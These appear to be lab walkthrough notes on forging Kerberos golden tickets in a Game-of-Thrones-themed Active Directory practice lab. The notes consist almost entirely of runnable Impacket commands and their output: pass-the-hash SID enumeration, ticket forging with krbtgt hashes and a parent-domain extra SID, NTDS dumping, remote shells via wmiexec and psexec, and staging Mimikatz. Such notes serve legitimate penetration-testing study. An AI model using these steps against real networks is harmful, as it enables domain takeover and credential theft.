# 5. Golden Ticket

## Finding SID

`lookupsid.py -hashes aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8 NORTH/EDDARD.STARK@10.4.10.22`

**Result:**

```
[*] Brute forcing SIDs at 10.4.10.22
[*] StringBinding ncacn_np:10.4.10.22[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-3779674392-1109536343-705869415
500: CASTELBLACK\Administrator (SidTypeUser)
501: CASTELBLACK\Guest (SidTypeUser)
503: CASTELBLACK\DefaultAccount (SidTypeUser)
504: CASTELBLACK\WDAGUtilityAccount (SidTypeUser)
513: CASTELBLACK\None (SidTypeGroup)
1000: CASTELBLACK\localuser (SidTypeUser)
1001: CASTELBLACK\SQLServer2005SQLBrowserUser$CASTELBLACK (SidTypeAlias)
```

---------------

**Child Domain SID:**

`lookupsid.py -hashes aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8 NORTH/EDDARD.STARK@10.4.10.11`

**Result:**

```
[*] Domain SID is: S-1-5-21-58534182-3680670537-1634125476
500: NORTH\Administrator (SidTypeUser)
501: NORTH\Guest (SidTypeUser)
502: NORTH\krbtgt (SidTypeUser)
512: NORTH\Domain Admins (SidTypeGroup)
513: NORTH\Domain Users (SidTypeGroup)
514: NORTH\Domain Guests (SidTypeGroup)
515: NORTH\Domain Computers (SidTypeGroup)
516: NORTH\Domain Controllers (SidTypeGroup)
517: NORTH\Cert Publishers (SidTypeAlias)
520: NORTH\Group Policy Creator Owners (SidTypeGroup)
521: NORTH\Read-only Domain Controllers (SidTypeGroup)
522: NORTH\Cloneable Domain Controllers (SidTypeGroup)
525: NORTH\Protected Users (SidTypeGroup)
526: NORTH\Key Admins (SidTypeGroup)
553: NORTH\RAS and IAS Servers (SidTypeAlias)
571: NORTH\Allowed RODC Password Replication Group (SidTypeAlias)
572: NORTH\Denied RODC Password Replication Group (SidTypeAlias)
1000: NORTH\localuser (SidTypeUser)
1001: NORTH\WINTERFELL$ (SidTypeUser)
1102: NORTH\DnsAdmins (SidTypeAlias)
1103: NORTH\DnsUpdateProxy (SidTypeGroup)
1104: NORTH\SEVENKINGDOMS$ (SidTypeUser)
1105: NORTH\CASTELBLACK$ (SidTypeUser)
1106: NORTH\Stark (SidTypeGroup)
1107: NORTH\Night Watch (SidTypeGroup)
1108: NORTH\Mormont (SidTypeGroup)
1109: NORTH\AcrossTheSea (SidTypeAlias)
1110: NORTH\arya.stark (SidTypeUser)
1111: NORTH\eddard.stark (SidTypeUser)
1112: NORTH\catelyn.stark (SidTypeUser)
1113: NORTH\robb.stark (SidTypeUser)
1114: NORTH\sansa.stark (SidTypeUser)
1115: NORTH\brandon.stark (SidTypeUser)
1116: NORTH\rickon.stark (SidTypeUser)
1117: NORTH\hodor (SidTypeUser)
1118: NORTH\jon.snow (SidTypeUser)
1119: NORTH\samwell.tarly (SidTypeUser)
1120: NORTH\jeor.mormont (SidTypeUser)
1121: NORTH\sql_svc (SidTypeUser)
```

**Parent Domain SID:**

`lookupsid.py -hashes aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8 NORTH/EDDARD.STARK@10.4.10.10`

```
498: SEVENKINGDOMS\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: SEVENKINGDOMS\Administrator (SidTypeUser)
501: SEVENKINGDOMS\Guest (SidTypeUser)
502: SEVENKINGDOMS\krbtgt (SidTypeUser)
512: SEVENKINGDOMS\Domain Admins (SidTypeGroup)
513: SEVENKINGDOMS\Domain Users (SidTypeGroup)
514: SEVENKINGDOMS\Domain Guests (SidTypeGroup)
515: SEVENKINGDOMS\Domain Computers (SidTypeGroup)
516: SEVENKINGDOMS\Domain Controllers (SidTypeGroup)
517: SEVENKINGDOMS\Cert Publishers (SidTypeAlias)
518: SEVENKINGDOMS\Schema Admins (SidTypeGroup)
519: SEVENKINGDOMS\Enterprise Admins (SidTypeGroup)
520: SEVENKINGDOMS\Group Policy Creator Owners (SidTypeGroup)
521: SEVENKINGDOMS\Read-only Domain Controllers (SidTypeGroup)
522: SEVENKINGDOMS\Cloneable Domain Controllers (SidTypeGroup)
525: SEVENKINGDOMS\Protected Users (SidTypeGroup)
526: SEVENKINGDOMS\Key Admins (SidTypeGroup)
527: SEVENKINGDOMS\Enterprise Key Admins (SidTypeGroup)
553: SEVENKINGDOMS\RAS and IAS Servers (SidTypeAlias)
571: SEVENKINGDOMS\Allowed RODC Password Replication Group (SidTypeAlias)
572: SEVENKINGDOMS\Denied RODC Password Replication Group (SidTypeAlias)
1000: SEVENKINGDOMS\localuser (SidTypeUser)
1001: SEVENKINGDOMS\KINGSLANDING$ (SidTypeUser)
1102: SEVENKINGDOMS\DnsAdmins (SidTypeAlias)
1103: SEVENKINGDOMS\DnsUpdateProxy (SidTypeGroup)
1104: SEVENKINGDOMS\NORTH$ (SidTypeUser)
1105: SEVENKINGDOMS\ESSOS$ (SidTypeUser)
1106: SEVENKINGDOMS\Lannister (SidTypeGroup)
1107: SEVENKINGDOMS\Baratheon (SidTypeGroup)
1108: SEVENKINGDOMS\Small Council (SidTypeGroup)
1109: SEVENKINGDOMS\DragonStone (SidTypeGroup)
1110: SEVENKINGDOMS\KingsGuard (SidTypeGroup)
1111: SEVENKINGDOMS\DragonRider (SidTypeGroup)
1112: SEVENKINGDOMS\AcrossTheNarrowSea (SidTypeAlias)
1113: SEVENKINGDOMS\tywin.lannister (SidTypeUser)
1114: SEVENKINGDOMS\jaime.lannister (SidTypeUser)
1115: SEVENKINGDOMS\cersei.lannister (SidTypeUser)
1116: SEVENKINGDOMS\tyron.lannister (SidTypeUser)
1117: SEVENKINGDOMS\robert.baratheon (SidTypeUser)
1118: SEVENKINGDOMS\joffrey.baratheon (SidTypeUser)
1119: SEVENKINGDOMS\renly.baratheon (SidTypeUser)
1120: SEVENKINGDOMS\stannis.baratheon (SidTypeUser)
1121: SEVENKINGDOMS\petyer.baelish (SidTypeUser)
1122: SEVENKINGDOMS\lord.varys (SidTypeUser)
1123: SEVENKINGDOMS\maester.pycelle (SidTypeUser)
```

**So, the SIDs are:** 

**Child Domain:** `S-1-5-21-58534182-3680670537-1634125476`
**Parent Domain:** `S-1-5-21-3848810514-1890589760-83533814`
**krbtgt hash:** `34b24f1a67d914d8ef876f8bd02f3f0b`
**krbtgt aes:** `badd865cdb6de2c5ee6e1d2baa1e02ff52b2bee490a90f1ee3d2624ad9aa9580`


`ticketer.py -nthash 34b24f1a67d914d8ef876f8bd02f3f0b -domain-sid S-1-5-21-58534182-3680670537-1634125476 -domain north.sevenkingdoms.local -extra-sid S-1-5-21-3848810514-1890589760-83533814 goldenuser`

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
/home/kali/.local/bin/ticketer.py:141: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  aTime = timegm(datetime.datetime.utcnow().timetuple())
[*] Customizing ticket for north.sevenkingdoms.local/goldenuser
/home/kali/.local/bin/ticketer.py:600: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(hours=int(self.__options.duration))
/home/kali/.local/bin/ticketer.py:718: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encTicketPart['authtime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
/home/kali/.local/bin/ticketer.py:719: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
/home/kali/.local/bin/ticketer.py:843: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in goldenuser.ccache
```



Parent domain NTDS
`secretsdump -k -no-pass -just-dc-ntlm north.sevenkingdoms.local/goldenuser@kingslanding.sevenkingdoms.local   `

**Working Golden Ticket**
`ticketer.py -aesKey badd865cdb6de2c5ee6e1d2baa1e02ff52b2bee490a90f1ee3d2624ad9aa9580 -domain-sid S-1-5-21-58534182-3680670537-1634125476 -extra-pac -domain north.sevenkingdoms.local -user-id 1111 eddard.stark`

`export KRB5CCNAME=/home/kali/eddard.stark.ccache`

`wmiexec.py -k -no-pass north.sevenkingdoms.local/eddard.stark@winterfell.north.sevenkingdoms.local`

**GOLDEN TICKET MIMIKATZ**
**Upload Mimikatz to target**

Use smbvclient to pass the hash with Robb.Stark and upload the mimikatz file.

`smbclient.py -hashes :831486ac7f26860c9e2f51ac91e1a07a NORTH/robb.stark@10.4.10.22`

Logn in with PSEXEC and pass-the-hash:

`psexec.py north.sevenkingdoms.local/eddard.stark@10.4.10.22 -hashes aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8`